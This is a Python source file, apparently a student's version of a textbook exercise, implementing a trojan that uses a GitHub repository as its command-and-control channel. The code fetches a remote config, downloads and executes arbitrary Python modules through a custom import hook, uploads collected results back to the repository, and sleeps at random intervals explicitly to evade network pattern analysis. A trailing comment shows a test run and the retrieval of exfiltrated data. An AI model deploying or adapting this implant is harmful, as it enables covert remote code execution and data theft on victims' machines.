import base64
import importlib.util
import github3
import importlib
import json
import random
import sys
import threading 
import time

from datetime import datetime

def github_connect(): # Reads github token
    with open('tkn.txt') as f: # Write created token to tkn file
        token = f.read().strip()
    user = 'AnLau25'
    sess = github3.login(token=token)
    return sess.repository(user, "bhptrojan")
    # Dif trojans require dif files, to control what each trojan does

def get_file_contents(dirname, module_name, repo): # Return contents to module
    return repo.file_contents(f'{dirname}/{module_name}').content



class Trojan:
    # Init trojan
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/' # where to write output file
        self.repo = github_connect()

    def get_config(self): # Retreive remote config document 
        config_json = get_file_contents(
            'config', self.config_file, self.repo
        )
        config = json.loads(base64.b64decode(config_json))
        for task in config:
            if task['module'] not in sys.modules:
                importlib.import_module(task['module'])
        return config     

    def module_runner(self, module): # Call run functin from imported module
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data): # Create file for output with name current date-time 
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self):
        while True:
            config = self.get_config() # Grab config from repo

            for task in config: # Kick off module with thread
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)
                ) # Call modules run function
                
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 3*60*60)) 
            # Sleep for x amount of time to foil network patern analisys



class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
    def __init__(self):
        self.current_module_code = b""
        self.repo = github_connect()

    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        try:
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
        except Exception as e:
            print(f"[!] Failed to get module: {e}")
            return None

        if new_library is None:
            return None

        self.current_module_code = base64.b64decode(new_library)
        return importlib.util.spec_from_loader(fullname, self)

    def create_module(self, spec):
        return None  # Use default module creation

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

    

if __name__ == '__main__':
    sys.meta_path.append(GitImporter()) # Create trojan obj
    trojan = Trojan('abc')
    trojan.run()        

# Test:
# python3 git_trojan.py  
# [*] Attempting to retrieve dirlister
# [*] Attempting to retrieve environment
# [*] In dirlister module
# [*] In environment module
#
# -------------------- have trojan run in another tab -------------------- 
#
# git pull origin master
# Username for 'https://github.com': AnLau25
# Password for 'https://AnLau25@github.com': 
# remote: Enumerating objects: 11, done. 
# remote: Counting objects: 100% (11/11), done.
# remote: Compressing objects: 100% (8/8), done.
# remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
# Unpacking objects: 100% (10/10), 3.57 KiB | 365.00 KiB/s, done.
# From https://github.com/AnLau25/bhptrojan
#  * branch            master     -> FETCH_HEAD
#    494a95e..bb8181c  master     -> origin/master
# Updating 494a95e..bb8181c
# Fast-forward
#  data/abc/2025-06-20T16:09:08.041822.data | 1 +
#  data/abc/2025-06-20T16:09:15.075340.data | 1 +
#  2 files changed, 2 insertions(+)
#  create mode 100644 data/abc/2025-06-20T16:09:08.041822.data
#  create mode 100644 data/abc/2025-06-20T16:09:15.075340.data




